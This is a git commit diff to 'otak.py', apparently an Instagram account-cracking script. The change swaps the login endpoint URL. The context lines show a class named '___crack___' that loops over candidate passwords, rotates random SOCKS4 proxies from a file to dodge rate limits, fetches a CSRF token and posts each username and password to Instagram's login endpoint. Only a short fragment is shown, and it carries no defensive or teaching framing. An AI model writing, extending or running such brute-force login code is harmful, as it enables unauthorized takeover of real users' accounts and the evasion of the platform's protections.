f6ef16524c89abeef7a4fdb3156eb6b490077913
MN4WN1-777 <86679493+MN4WN1-777@users.noreply.github.com>
2022-06-10 03:04:46 +0700

    Update otak.py

--- otak.py
+++ otak.py
@@ -404,7 +404,7 @@ class ___crack___:
             for pw in pwx:
                 pw = pw.lower()
                 ___url = ('https://z-p42.www.instagram.com/')
-                ___login = ('https://www.instagram.com/accounts/login/ajax/')
+                ___login = ('https://i.instagram.com/accounts/login/ajax/')
                 ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
                 ___data = {'username': uid,
